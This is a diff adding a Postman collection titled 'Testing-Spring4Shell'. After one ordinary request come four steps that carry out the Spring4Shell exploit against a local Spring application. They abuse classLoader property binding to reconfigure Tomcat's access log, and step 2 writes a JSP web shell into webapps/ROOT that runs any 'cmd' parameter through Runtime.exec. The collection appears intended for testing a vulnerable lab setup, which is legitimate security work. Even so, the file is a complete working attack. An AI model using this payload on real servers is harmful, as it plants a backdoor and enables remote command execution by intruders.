@@ -1,0 +1,193 @@
+{
+	"info": {
+		"_postman_id": "8ff63c06-d17f-44f1-8a1b-4722367ec96a",
+		"name": "Testing-Spring4Shell",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "greeting-with-member normal case",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "id",
+							"value": "1",
+							"type": "text"
+						},
+						{
+							"key": "content",
+							"value": "chaos",
+							"type": "text"
+						},
+						{
+							"key": "member.name",
+							"value": "hai",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "localhost:8080/greeting",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"greeting"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "step-1",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat",
+							"value": "_",
+							"type": "default"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://localhost:8080/helloworld/greeting",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"helloworld",
+						"greeting"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "step-2",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.pattern",
+							"value": "%{prefix}i java.io.InputStream in = %{c}i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %{suffix}i",
+							"type": "default"
+						},
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.suffix",
+							"value": ".jsp",
+							"type": "default"
+						},
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.directory",
+							"value": "webapps/ROOT",
+							"type": "default"
+						},
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.prefix",
+							"value": "shell",
+							"type": "default"
+						},
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat",
+							"value": "",
+							"type": "default"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://localhost:8080/helloworld/greeting",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"helloworld",
+						"greeting"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "step-3",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "prefix",
+						"value": "<%",
+						"type": "default"
+					},
+					{
+						"key": "suffix",
+						"value": "%>//",
+						"type": "default"
+					},
+					{
+						"key": "c",
+						"value": "Runtime",
+						"type": "default"
+					}
+				],
+				"url": {
+					"raw": "http://localhost:8080/helloworld/greeting",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"helloworld",
+						"greeting"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "step-4",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.pattern",
+							"value": "",
+							"type": "default"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://localhost:8080/helloworld/greeting",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"helloworld",
+						"greeting"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
